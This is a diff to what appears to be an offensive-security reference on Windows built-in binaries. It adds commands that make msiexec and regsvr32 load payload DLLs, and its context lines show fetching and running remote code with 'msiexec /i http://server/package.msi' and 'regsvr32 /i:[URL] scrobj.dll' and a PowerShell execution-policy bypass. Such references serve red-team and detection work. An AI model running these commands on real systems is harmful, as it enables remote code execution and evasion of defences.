@@ -58,6 +58,8 @@ https://github.com/hfiref0x/UACME
 - msiexec.exe
   - Description - The Windows installer typically used to install new software or patches. It be used to download and execute a remote payload.
   - Example: msiexec /i http://server/package.msi
+  - Example: msiexec /y payload.dll
+  - Example: msiexec /z payload.dll
 
 - mshta.exe
   - Description: MSHTA can be used to execute HTA files (containing scripts) or directly execute VBScript/JScript from the command line.
@@ -76,8 +78,9 @@ https://github.com/hfiref0x/UACME
   - Example: powershell -exec bypass -File test.ps1
   
 - regsvr32.exe
-  - Description: Command-line tool that registers dll files as command components in the registry. Notable for its use to bypass UAC and useful as it supports remote DLL retrieval.
+  - Description: Command-line tool that registers dll files as command components in the registry. Notable for its use to bypass UAC and useful as it supports remote DLL retrieval with scrobj.dll. No arguments need to be supplied to regsvr32 if the dll exports the function DllRegisterServer. 
   - Example: regsvr32 /s /n /u /i:[URL] scrobj.dll
+  - Example: regsvr32 payload.dll
 
 - rundll32.exe
   - Description: Loads and runs DLLs. Three parameters are typically used, the DLL to be executed, the function within the DLL to call and any arguments.
